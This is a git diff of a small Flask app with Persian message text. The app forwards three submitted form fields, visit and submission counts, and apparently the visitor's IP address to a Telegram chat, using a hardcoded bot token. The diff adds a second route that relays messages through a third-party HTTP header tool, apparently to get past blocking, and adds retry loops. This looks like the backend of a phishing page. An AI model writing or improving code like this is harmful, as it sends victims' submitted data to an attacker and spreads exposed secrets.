@@ -13,19 +13,24 @@ Months = {
 }
 
 
-def SendMessageToTelegramDirect(Message):
-   req = requests.get("https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id=-1001946865397&text="+Message)
-   return req
+def SendMessageToTelegramDirect(Message) -> bool:
+    try:
+        requests.get("https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id=-1001946865397&text="+Message)
+        return True
+    except:
+        return False
 
-def SendMessageToTelegramIndirect(Message):
-
+def SendMessageToTelegramIndirect(Message) -> bool:
     settings = {
         "UrlBox": "https://api.telegram.org/bot6744041909:AAE-DQD8TuJpVAWZv0UDKL3_8YAcJetblmU/sendmessage?chat_id=-1001946865397&text="+Message,
         "MethodList": "POST"
     }
-    req = requests.post(
-        "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", settings)
-    return req
+    try:
+        requests.post(
+            "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", settings)
+        return True
+    except:
+        return False
 
 
 app = Flask(__name__ , template_folder=".")
@@ -53,7 +58,8 @@ def SendToTelegram(f1 , f2 , f3 , visited , submited , id):
         {submited} بار فیلد هارو پر کرده 
         {time} {day} {DayOfMonth} {Month} 
         """
-    SendMessageToTelegramDirect(message)
+    while not SendMessageToTelegramDirect(message):
+        SendMessageToTelegramDirect(message)
 
 def ipaddress(request):
     try:
